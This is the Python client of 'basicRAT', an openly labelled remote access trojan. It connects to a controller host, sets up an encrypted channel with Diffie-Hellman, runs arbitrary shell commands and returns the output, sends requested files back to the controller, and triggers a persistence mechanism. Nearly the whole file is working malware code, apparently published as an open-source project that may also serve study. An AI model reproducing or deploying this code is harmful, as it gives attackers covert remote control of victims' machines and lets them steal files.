#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# basicRAT client
# https://github.com/vesche/basicRAT
#

import socket
import subprocess
import struct
import sys

from core import common
# from core import crypto
from core import persistence

# temporary
from core.crypto import diffiehellman
from core.crypto import AES_encrypt as encrypt
from core.crypto import AES_decrypt as decrypt


HOST    = 'localhost'
PORT    = 1337
FB_KEY  = '82e672ae054aa4de6f042c888111686a'
# generate your own key with...
# python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"


def main():
    s = socket.socket()
    s.connect((HOST, PORT))
    
    DHKEY = diffiehellman(s)
    # debug: confirm DHKEY matches
    # print binascii.hexlify(DHKEY)
    
    while True:
        data = s.recv(1024)
        data = decrypt(data, DHKEY)

        # seperate prompt into command and action
        cmd, _, action = data.partition(' ')

        # stop client
        if cmd == 'quit':
            s.close()
            sys.exit(0)

        # run command
        elif cmd == 'run':
            results = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall(encrypt(results, DHKEY))

        # send file
        elif cmd == 'download':
            for fname in action.split():
                fname = fname.strip()
                #print 'requested file: {}'.format(fname)
                with open(fname, 'rb') as f:
                    res = f.read(4096)
                    while len(res):
                        enc_res = encrypt(res, DHKEY)
                        s.send(struct.pack("!I", len(enc_res)))
                        s.send(enc_res)
                        res = f.read(4096)
                    s.send('\x00\x00\x00\x00') # EOF

        # regenerate DH key (dangerous! may cause connection loss)
        # available in case a fallback occurs or you suspect evesdropping
        elif cmd == 'rekey':
            DHKEY = diffiehellman(s)

        # apply persistence mechanism
        elif cmd == 'persistence':
            success, details = persistence.run()
            if success:
                results = 'Persistence successful, {}.'.format(details)
            else:
                results = 'Persistence unsuccessful, {}.'.format(details)
            s.send(encrypt(results, DHKEY))


if __name__ == '__main__':
    main()
